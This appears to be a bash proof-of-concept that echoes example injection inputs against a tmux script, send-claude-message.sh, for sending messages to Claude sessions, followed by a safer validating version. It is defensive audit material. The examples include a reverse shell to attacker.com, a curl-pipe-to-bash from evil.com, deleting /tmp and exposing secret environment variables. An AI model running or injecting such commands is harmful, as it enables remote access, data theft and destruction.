#!/bin/bash

# Proof of Concept: Demonstrating vulnerabilities in send-claude-message.sh
# This script shows what WOULD happen with malicious inputs
# DO NOT RUN THESE COMMANDS IN PRODUCTION

echo "=== Vulnerability Demonstration for send-claude-message.sh ==="
echo "WARNING: These are examples of dangerous inputs - DO NOT EXECUTE"
echo ""

echo "1. Command Injection Examples:"
echo "   Input: ./send-claude-message.sh window:1 '; echo HACKED > /tmp/pwned.txt'"
echo "   Result: Would execute the echo command in the target window"
echo ""

echo "2. Multi-command Injection:"
echo "   Input: ./send-claude-message.sh window:1 'test; whoami; pwd; ls -la'"
echo "   Result: Would execute all commands sequentially"
echo ""

echo "3. Reverse Shell Injection:"
echo "   Input: ./send-claude-message.sh window:1 '; nc -e /bin/bash attacker.com 4444'"
echo "   Result: Would open a reverse shell to attacker"
echo ""

echo "4. File Deletion:"
echo "   Input: ./send-claude-message.sh window:1 '; rm -rf /tmp/*'"
echo "   Result: Would delete all files in /tmp"
echo ""

echo "5. Environment Variable Exposure:"
echo "   Input: ./send-claude-message.sh window:1 '; env | grep SECRET'"
echo "   Result: Would expose environment variables"
echo ""

echo "6. Download and Execute:"
echo "   Input: ./send-claude-message.sh window:1 '; curl evil.com/malware.sh | bash'"
echo "   Result: Would download and execute remote script"
echo ""

echo "7. Tmux Escape Sequences:"
echo "   Input: ./send-claude-message.sh window:1 '\033Ptmux;\033\033]0;HACKED\007\033\\'"
echo "   Result: Could manipulate tmux or terminal behavior"
echo ""

echo "8. Buffer Overflow Attempt:"
LONG_PAYLOAD=$(printf 'A%.0s' {1..10000})
echo "   Input: ./send-claude-message.sh window:1 '[10000 A characters]'"
echo "   Result: Could cause buffer issues or DoS"
echo ""

echo "9. Path Traversal:"
echo "   Input: ./send-claude-message.sh '../../../other-session:window' 'message'"
echo "   Result: Might target unintended sessions"
echo ""

echo "10. Format String Attack:"
echo "    Input: ./send-claude-message.sh 'window:%s%s%s%s' 'test'"
echo "    Result: Could cause undefined behavior"
echo ""

echo "=== Safe Alternative Example ==="
echo "Here's how the script SHOULD handle input:"
echo ""
cat << 'EOF'
# Safe version with validation
WINDOW="$1"
MESSAGE="$2"

# Validate window format
if [[ ! "$WINDOW" =~ ^[a-zA-Z0-9_-]+:[a-zA-Z0-9_-]+$ ]]; then
    echo "Invalid window format"
    exit 1
fi

# Use -l flag for literal input
tmux send-keys -t "$WINDOW" -l "$MESSAGE"
EOF